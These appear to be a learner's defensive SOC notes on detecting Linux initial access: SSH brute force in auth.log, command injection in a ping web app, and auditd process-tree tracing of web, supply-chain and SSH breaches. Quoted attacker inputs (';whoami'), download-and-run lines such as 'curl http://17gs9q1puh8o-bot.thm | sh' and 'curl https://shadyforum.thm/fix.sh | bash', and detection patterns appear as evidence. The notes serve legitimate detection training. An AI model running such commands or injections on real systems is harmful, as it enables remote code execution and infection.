# Initial Access via SSH

SSH is one of the most popular Initial Access methods on Linux servers. Nearly every Internet-facing Linux machine runs it, and Shodan reports [over 40 million](https://www.shodan.io/search?query=ssh) exposed machines in 2025 (figure from the source).

## SSH and RDP Compared

- Both are powerful, often poorly defended remote access services
- Both fall under one MITRE technique: [External Remote Services (T1133)](https://attack.mitre.org/techniques/T1133/)
- Threat groups run vast botnets that scan the Internet for exposed SSH

| | Windows | Linux |
|---|---|---|
| Service | RDP | SSH |
| Common attack | Brute force | Brute force, stolen keys |
| MITRE technique | T1133 | T1133 |

## Two Ways In

Attackers get access with a **stolen key** or a **breached password**.

### 1. Key-Based Authentication Risks

[Key-based authentication](https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server) is the secure option, but keys can still leak:

- Attackers reach a service or source code where private keys are stored
  - Examples: a GitHub repository, an Ansible automation server holding SSH credentials
- Attackers steal keys by infecting an admin's laptop with a data stealer (see the Collection notes: `C:\Users\<user>\.ssh\*` is a listed target)

### 2. Password-Based Authentication Risks

Everything above, plus:

- IT admin sets a weak password for a quick test and forgets to revert it
- IT support enables SSH for a contractor, who sets the password to `12345678`
- Network engineer accidentally exposes an old, insecure SSH server to the Internet

## Real-World Example

- Most real Linux attacks start from one of these scenarios
- Example: the [Outlaw](https://thehackernews.com/2025/04/outlaw-group-uses-ssh-brute-force-to.html#:~:text=Outlaw%20is%20a%20Linux%20malware%20that%20relies%20on%20SSH%20brute%2Dforce%20attacks) group, Linux malware that relies on SSH brute force

## Advanced Risks

- Vulnerability in the SSH server itself, notably [Erlang/OTP](https://tryhackme.com/room/erlangotpsshcve202532433)
- [SSH session hijacking (T1563.001)](https://attack.mitre.org/techniques/T1563/001/)
- The paste ends with a trailing comma, so the sentence looks cut off; paste the rest if there was more

## Detection Tips

- Brute force shows in `auth.log` as many `Failed password for <user> from <ip>` lines (see the auth.log note)
- Targeted names to expect: `root`, `admin`, `ubuntu`, `test`, service accounts
- A success after many failures (`Accepted password`) from the same IP means the brute force worked
- **Stolen key logins leave no failures**: you'll only see `Accepted publickey`, so check the source IP, time, and user against what's normal
- Quick brute force count:

        grep "Failed password" /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -nr

- After a login, check the runtime logs: auditd `execve` events by `auid`, then `useradd`/`usermod` and `sudo COMMAND=` lines
- Prevention (general knowledge, not in the lesson):
  - Disable password login (`PasswordAuthentication no` in `sshd_config`)
  - Disable root login (`PermitRootLogin no`)
  - Use keys with passphrases, and rotate any key that was stored in a repo
  - Rate-limit with `fail2ban` or firewall rules
  - Don't expose SSH to the Internet; use a VPN or jump host
- Auditd already watches `/etc/ssh/sshd_config` in the lesson's example, since attackers edit it to keep access

---

# Detecting SSH Attacks (Linux)

SSH detection on Linux is simpler than on Windows: list the successful logins, then check a few fields (auth method, source IP, time, user).

## SSH Breach Scenario

Three admin mistakes together make a breach inevitable:

1. Public SSH access
2. Password authentication allowed
3. Weak password on a support user

- Result: a brute force, then a password breach, so it's a matter of time
- The paste says "three indicators of malicious logins" and then stops with a colon, and the log sample image didn't come through
- The three red flags are listed below from the text that follows

## Listing Successful Logins

    cat /var/log/auth.log | grep -E 'Accepted'

    2025-08-19T14:00:02 thm-vm sshd[1013]: Accepted publickey for ansible from 10.14.105.255 port 18442 ssh2: [...]
    2025-08-20T12:56:49 thm-vm sshd[2830]: Accepted password for jsmith from 54.155.224.201 port 51058 ssh2
    2025-08-22T03:14:06 thm-vm sshd[2830]: Accepted password for jsmith from 196.251.118.184 port 51058 ssh2

## Login 1: `ansible` (Likely Legitimate)

| Check | Observation | Verdict |
|---|---|---|
| Auth method | `publickey` | Good sign |
| Source IP | `10.14.105.255`, internal | Good sign |
| Timing | Exactly 14:00 | Matches a periodic task |

- Still verify that `10.14.105.255` really is the Ansible server
- Review what the account did after logging in

## Logins 2 and 3: `jsmith` (Suspicious)

Three red flags:

| Red flag | Why |
|---|---|
| Password authentication | Weaker than keys, and the method brute force wins |
| External source IPs | `54.155.224.201`, `196.251.118.184` |
| Time and IP change | Two different IPs, and the 03:14 login is likely night time for the user |

- Two logins from two unrelated external IPs for one user within two days is a strong signal of a shared or stolen password
- The same `sshd[2830]` PID and port `51058` on both lines is not realistic (a PID and source port don't repeat across days); this looks like a synthetic lab log, so don't treat it as a real-world pattern

## Questions to Answer Before a Verdict

| Question | How to check |
|---|---|
| **Username:** who owns it? Is this time and IP expected? | Ask the owner, check HR or asset records |
| **Source IP:** trusted or malicious? | [Threat intel tools](https://tryhackme.com/room/ipanddomainthreatintel), [asset lookups](https://tryhackme.com/room/socworkbookslookups) |
| **Login history:** was it preceded by brute force or other suspicious events? | Search `Failed password` for the same IP and user |
| **Next steps:** is it suspicious? Should I analyze what the user did after logging in? | Auditd `execve` events by `auid`, `sudo COMMAND=` lines |

## Detection Tips

- Check for brute force before the success:

        grep "Failed password" /var/log/auth.log | grep -E 'jsmith|196.251.118.184'

- Count failures per source IP to find the attacker:

        grep "Failed password" /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -nr

- Note that `jsmith`'s `Accepted password` lines don't mention failures; if there were none, the password may have been **reused or leaked** and not brute forced, which a failure-count search alone would miss
- Quick triage rules:
  - `Accepted publickey` from internal IP at a regular time: usually automation
  - `Accepted password` from an external IP: investigate
  - Same user from different countries or IPs close together: investigate
- After a confirmed breach, follow the user's session:
  - Auditd: `auid=jsmith`, look for `wget`, `curl`, and changes to `sshd_config` or `authorized_keys`
  - `auth.log`: `useradd`, `usermod`, and `sudo` lines (see the earlier notes)
- Windows parallel: this is the Linux version of the RDP checks (`4625` flood, then `4624` success)

---

# Linux Public Services and Web as Initial Access

Linux hosts run public-facing services (web, email, databases, IT tools) and power most firewall and VPN software. If one of those apps is compromised, the whole host is at risk. MITRE technique: [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/).

## Real-World Examples

| Target | What happened |
|---|---|
| [Zimbra Collaboration CVE](https://thehackernews.com/2024/10/researchers-sound-alarm-on-active.html) | Attackers could run arbitrary OS commands |
| [Exposed Docker API port](https://www.aquasec.com/blog/threat-alert-teamtnts-docker-gatling-gun-campaign/#:~:text=The%20campaign%20gains%20initial%20access%20by%20exploiting%20exposed%20Docker%20daemons) | Entry point in a series of cloud infrastructure breaches |
| [Palo Alto firewall CVE](https://unit42.paloaltonetworks.com/cve-2024-3400/) | Full control of the Linux-based firewall OS |
| [WordPress plugins feature](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) | Abused to upload malware like web shells |

## Using Application Logs

- Apps won't log "I am being exploited by a zero-day right now"
- They rarely tell the full story, but they leave unique artifacts

| Log | Use |
|---|---|
| Web logs | Detect a variety of web attacks |
| Database logs | Spot suspicious SQL queries |
| VPN logs | Spot abnormal VPN logins |
| Other app logs | Specific events like bank transactions |

## Example: TryPingMe (Command Injection)

- Web app that pings a user-supplied IP
- Internally runs `ping -c 2 [YOUR-INPUT]` with **no input filtering**
- Vulnerability: [command injection](https://tryhackme.com/room/oscommandinjection)

### Nginx Access Log

    cat /var/log/nginx/access.log
    10.2.33.10    - - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 [...]
    10.12.88.67   - - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 [...]
    10.14.105.255 - - [26/Aug/2025:20:09:43] "GET /ping?host=hello HTTP/1.1" 500 [...]
    10.14.105.255 - - [26/Aug/2025:20:09:46] "GET /ping?host=whoami HTTP/1.1" 500 [...]
    10.14.105.255 - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200 [...]
    10.14.105.255 - - [26/Aug/2025:20:10:41] "GET /ping?host=;ls HTTP/1.1" 200 [...]

### Reading the Log

| Source | Request | Verdict |
|---|---|---|
| `10.2.33.10`, `10.12.88.67` | `host=` a real IP, status 200 | Normal use |
| `10.14.105.255` | `host=` a word or Linux command | Suspicious |

Attacker timeline (all from `10.14.105.255`):

| Time | Input | Status | What it shows |
|---|---|---|---|
| 20:09:43 | `hello` | 500 | Testing: not an IP, ping fails |
| 20:09:46 | `whoami` | 500 | Testing: command alone fails (treated as hostname) |
| 20:09:49 | `;whoami` | 200 | `;` separates commands, so `whoami` ran: injection works |
| 20:10:41 | `;ls` | 200 | Now listing files |

- `500` then `500` then `200` is trial and error ending in success
- `;` is the shell command separator: `ping -c 2 ;whoami` runs `ping`, then `whoami`
- The 200 only means the app responded, not that the command output was returned

### What You Can Conclude From Web Logs Alone

- `10.14.105.255` is likely the attacker's IP
- `/ping` is vulnerable and allows code execution
- The attacker ran OS commands (`whoami`, `ls`)
- The whole system is at risk because of this one flaw
- Next step: a deep investigation (what else ran, what changed)

## Worth Noticing

- `10.14.105.255` is the same IP as the `ansible` publickey login in the SSH detection note
- It is also a private (internal) address, while normal users ping public IPs
- In a real case that would mean a compromised internal host or Ansible server used to pivot, so check that host too
- It may just be lab reuse, so don't treat it as a confirmed link

## Detection Tips

- Hunt for shell metacharacters in query strings: `;`, `|`, `&&`, backtick, `$(`
- Check URL-encoded forms too: `%3B` (`;`), `%7C` (`|`), `%26` (`&`), `%60` (backtick)

        grep -E "(;|%3B|\||%7C|&&|%26%26|\`|%60|\\$\()" /var/log/nginx/access.log

- Command names in parameters: `whoami`, `id`, `ls`, `cat`, `wget`, `curl`
- Bursts of `500` from one IP followed by a `200` suggest probing then success
- Confirm on the host with auditd (see the auditd note): the web server user (`www-data`, `nginx`) or app process spawning `sh`, `whoami`, `ls`, `wget` (`execve` events, check `ppid`)
- Access logs only show `GET` query strings; a `POST` body injection won't appear (see the access log limitations note)
- After a confirmed hit, check for persistence and tool downloads: cron changes, new users, `wget`/`curl` runs
- Windows parallel: the web shell and command injection notes, same T1190 entry point

---

# Building a Process Tree (Linux)

Application logs aren't always available or helpful, so most SOC teams trace a suspicious command back through its parents to find how it started. Wiz used a process tree this way in its Selenium server breach report (link not in the paste).

## Scenario

- Alert: a suspicious command, e.g. `whoami`
- Question: IT activity, or a service breach?
- Method: build the process tree and trace the command to its parent

## Auditd Commands

| Command | Purpose |
|---|---|
| `ausearch -i -x <name>` | Find events by command name |
| `ausearch -i --pid <pid>` | Look up a process by its ID (use the parent's ID to walk up) |
| `ausearch -i --ppid <pid>` | List all children of a process |

- Walk up until you reach PID 1, the OS's first process
- `-i` makes output readable (same as the auditd note)

## Walking Up From `whoami`

    ausearch -i -x whoami
    proctitle=whoami
    ... ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec

    ausearch -i --pid 3905
    proctitle=/bin/sh -c whoami
    ... ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec

    ausearch -i --pid 3898
    proctitle=/usr/bin/python3 /opt/mywebapp/app.py
    ... ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec

| Level | PID | Process | Parent PID |
|---|---|---|---|
| Grandparent | 3898 | `python3 /opt/mywebapp/app.py` | 1 (OS) |
| Parent | 3905 | `/bin/sh -c whoami` | 3898 |
| Child | 3907 | `whoami` | 3905 |

Tree:

    python3 /opt/mywebapp/app.py   (PID 3898, started by PID 1)
    └── /bin/sh -c whoami          (PID 3905)
        └── whoami                 (PID 3907)

What it tells you:
- `whoami` was launched by a Python web app, not by a person
- `auid=unset` and `tty=(none)`: no login session and no terminal, so a background service ran it
- `ppid=1` on the app: started by the OS as a service
- `/bin/sh -c <command>`: the app spawned a shell to run a command, the same way the TryPingMe command injection runs input
- Raises the question: was the app breached and used as an entry point?

## Checking for Worse Commands

`whoami` alone might be normal app behavior, but confirming that needs web logs, research, or the developers. Faster check: list everything the app launched.

    ausearch -i --ppid 3898 | grep 'proctitle'

    proctitle=/bin/sh -c whoami
    proctitle=/bin/sh -c ls -la
    proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh

| Command | Meaning |
|---|---|
| `whoami` | Discovery: which user am I |
| `ls -la` | Discovery: list files |
| `curl http://17gs9q1puh8o-bot.thm \| sh` | Downloads a script and runs it immediately |

- The sequence is whoami, ls, then a download: the discovery to ingress tool transfer order from the Windows notes
- `curl ... | sh` is the strongest evidence: web apps don't normally download and execute remote scripts
- The domain looks random and "bot"-named, so a likely C2 or malware host
- All three commands came within about 2 seconds of each other, which points to a script or automation, not someone typing
- Verdict: the app was very likely breached (Initial Access via T1190, the same technique as the TryPingMe note)

## Detection Tips

- Judge the **parent**, not the command: `whoami` from an admin's SSH session is fine, from `app.py` is not
- Services that shouldn't spawn shells: web servers (`nginx`, `apache2`, `www-data`), app runtimes (`python3`, `node`, `java`), databases
- Quick checks on `ausearch` output:
  - `auid=unset` plus `/bin/sh -c` means a service launched a shell
  - Download-and-execute: `curl | sh`, `wget -O- | sh`, `bash -c "$(curl ...)"`
- Next steps after a hit:
  - Pull the web logs for the same time window (look for injection in query strings)
  - Check what the downloaded script did: more children of PID 3898, new files, cron or user changes
  - Block the domain, isolate the host
- Windows parallel: the same method as Sysmon Event ID 1 with `ProcessId` and `ParentProcessId`, e.g. `w3wp.exe` spawning `cmd.exe`

# Human-Led Linux Attacks, Supply Chain, and Process Tree Detection

Phishing and USB attacks are harder on Linux because servers are run by technical people, but the risk remains. Supply chain attacks hit Linux too, and one method catches all of these: process tree analysis.

## Human-Led Attacks

| Scenario | Consequence |
|---|---|
| IT member tries a forum fix: `curl https://shadyforum.thm/fix.sh \| bash` | Script not checked, it was malware, server silently infected |
| Developer mistypes a package: `pip3 install fastpi` (meant `fastapi`) | Typo package was malware published by threat actors (typosquatting) |

- Both are user mistakes, like phishing on Windows
- `curl ... | bash` runs unreviewed code with the user's privileges
- The lesson links "Read more" and "Real-world case" sources, but no URLs came through

## Supply Chain Compromise

- Attackers breach a piece of software first, then infect all its users through a malicious update
- Not unique to Linux, but a typical server uses hundreds of dependencies from different developers, so an attack can come from anywhere, anytime

| Example | Impact |
|---|---|
| XZ Utils backdoor | Nearly breached millions of Linux servers; the lesson ties the library to SSH |
| tj-actions breach | Leaked thousands of secrets, like SSH keys and access tokens |

- General knowledge, not in the lesson: the XZ backdoor is CVE-2024-3094, and tj-actions is a GitHub Actions component, so its leak hit CI/CD pipelines

## Detecting the Attacks

All the Initial Access techniques in this series can be found with process tree analysis:

1. Start with a trigger: a SIEM alert on a suspicious command, or a connection to a known malicious IP
2. Build the process tree to see which application or user started it (web server, internal app, or an admin's SSH session)
3. Decide: legitimate activity or malicious behavior?

## Screenshot: Three Process Trees

### 1. Web Application Breach

Question: why would the web app run `whoami`?

    systemd                  ← OS process (PID=1)
    └── apache2              ← Apache web server
        └── php-fpm          ← PHP web application
            └── sh -c whoami ← the spawned shell
                └── whoami   ← whoami command

- A web server running discovery commands through a shell points to a breach, such as command injection or a web shell

### 2. Supply Chain Compromise

Question: why would the TryHackMe app run these commands?

    systemd                  ← OS process (PID=1)
    └── thm-service          ← TryHackMe service
        ├── wget             ← wget command
        ├── base64           ← base64 command
        └── tar              ← tar command

- A trusted service suddenly downloads, decodes, and unpacks files, which could mean a malicious update
- This is the hardest to call: the parent is a legitimate service, so you need to check recent updates or dependency changes

### 3. SSH Breach

Question: why would Tom log in via SSH and download a cryptominer?

    systemd                  ← OS process (PID=1)
    └── sshd                 ← SSH server
        └── sshd (user=tom)  ← Tom's SSH session
            ├── curl         ← the spawned shell/download
            └── xmrig        ← XMRig cryptominer

- `xmrig` is a well-known cryptominer, so the activity is malicious whoever ran it
- Question for the SOC: was it really Tom, or a stolen password or key?

## Quick Comparison

| Tree | Parent chain | Suspicious child | Likely cause |
|---|---|---|---|
| 1 | `apache2` → `php-fpm` | `sh -c whoami` | Web app breach |
| 2 | `thm-service` | `wget`, `base64`, `tar` | Supply chain compromise |
| 3 | `sshd` (user=tom) | `curl`, `xmrig` | SSH breach |

- The suspicious part is always the same: a **parent that shouldn't run those children**
- The parent tells you the Initial Access path: web server, app, or SSH session

## Detection Tips

- Judge the parent, not just the command: `whoami` from an admin's SSH session is fine, from `php-fpm` is not
- Services that shouldn't spawn shells: `apache2`, `nginx`, `php-fpm`, `python3` apps, databases
- For SSH cases, pair with `auth.log`: find the `Accepted` login and check password versus key, source IP, and time
- For supply chain cases: check recent package updates in `dpkg.log` or `apt/`, and what changed in the service's files
- Watch for download-and-run patterns: `curl | bash`, `wget -O- | sh`, `base64 -d | sh`
- Commands to walk the tree (from the auditd note):

        ausearch -i -x <command>
        ausearch -i --pid <parent_pid>
        ausearch -i --ppid <pid> | grep proctitle

- Prevention (general knowledge, not in the lesson):
  - Read scripts before piping them to a shell
  - Double-check package names before installing, and use trusted or pinned versions
  - Keep a software inventory of dependencies
